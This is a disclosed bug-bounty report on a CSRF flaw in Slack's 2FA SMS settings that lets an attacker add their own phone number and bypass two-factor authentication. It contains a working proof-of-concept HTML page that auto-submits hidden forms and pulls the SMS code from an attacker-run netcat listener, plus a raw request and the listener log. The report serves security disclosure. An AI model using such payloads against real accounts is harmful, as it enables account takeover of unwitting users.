# CSRF - Add optional two factor mobile number

## Report Details
- **Report ID**: 155774
- **URL**: https://hackerone.com/reports/155774
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2016-08-01T10:54:51.599Z
- **Disclosed**: 2016-08-17T21:39:53.991Z

## Reporter
- **Username**: nhavis
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: slack

## Vulnerability Information
Description
====================
Adding a mobile number for 2-factor authentication is vulnerable to CSRF, allowing an attacker to bypass 2-factor authentication. An attacker would be able to force the logged in user to add a new mobile number for 2-factor authentication. The attacker would then receive the SMS code and automatically make the victim verify it (in Javascript). When the attacker attempts to login to the victim's account, the verification code can then be sent to the attacker's mobile number. 

An attacker could be anyone trying to bypass 2-factor authentication, for example:
1. Anyone who already has the password to an account.
2. A company's IT administrator who has access to the user's e-mail and can reset the password.

I have provided a complete Proof of Concept without the **crumb** parameter, which I have manually verified myself.

Vulnerable URL:
====================
* /account/settings/2fa_sms

Root cause:
====================
Server does not validate the existence or value of the **crumb** parameter containing the CSRF token.

Sample vulnerable request:
====================
```
POST /account/settings/2fa_sms HTTP/1.1
Host: cs-sa.slack.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate, br
Cookie: REDACTED=REDACTED
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 109

verify_two_factor=1&backup=&app=&primary_phone_number=%2B61+0████████&country_code=AU&phone_number=█████████
```

Attack flow:
====================
1. Attacker sends logged in slack user a link and slack user clicks it.
2. The link contains HTML and Javascript code that forces the victim in to adding a new 2-factor mobile number (**slackcsrf.html** provided below). The code does not contain the **crumb** parameter.
3. The code also connects back to the attacker's machine waiting for the attacker to enter the code so it can be used for verification (within seconds and potentially automatically).
4. The attacker receives the code via SMS and sends it back to the victim. (**Attacker web server** provided below)
5. The HTML code forces the victim to verify the new mobile number.
6. The mobile number has now been added to the victim's account for 2FA.
7. The attacker logs in and bypasses 2FA by requesting the code with the secondary mobile number.

slackcsrf.html:
---------------------
```
<html>
<body>
<IFRAME style="display:none" name="hidden-form"></iframe>
    <form action="https://cs-sa.slack.com/account/settings/2fa_sms" method="POST" target="hidden-form" name="pocframe">
      <input type="hidden" name="verify&#95;two&#95;factor" value="1" />
      <input type="hidden" name="backup" value="" />
      <input type="hidden" name="app" value="" />
      <input type="hidden" name="country&#95;code" value="AU" />
      <input type="hidden" name="phone&#95;number" value="█████████" />
    </form>
<script>document.pocframe.submit();</script>

<script src="http://192.168.1.82:8080/a"></script>
<IFRAME style="display:none" name="hidden-form2"></iframe>
    <form action="https://cs-sa.slack.com/account/settings/2fa_sms" method="POST" target="hidden-form2" name="pocframe2">
      <input type="hidden" name="verify&#95;two&#95;factor" value="1" />
      <input type="hidden" name="backup" value="1" />
      <input type="hidden" name="app" value="" />
      <input type="hidden" name="formatted&#95;phone&#95;number" value="&#43;61&#32;████████" />
      <input type="hidden" name="country&#95;code" value="AU" />
      <input type="hidden" id="scode" name="confirmation&#95;code" value="" />
    </form>
<script>
	document.getElementById("scode").value = scode;
	document.pocframe2.submit();
</script>
</body>
</html>
```

Attacker web server:
---------------------
```
root@foxtrotter:/var/www/html# nc -nlvp 8080
listening on [any] 8080 ...
connect to [192.168.1.82] from (UNKNOWN) [192.168.1.81] 56194
GET /a HTTP/1.1
Host: 192.168.1.82:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
Accept: */*
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.1.82/slackcsrf.html
Connection: close
Cache-Control: max-age=0

HTTP/1.1 200 OK

scode=196206;
```


## Attachments
No attachments
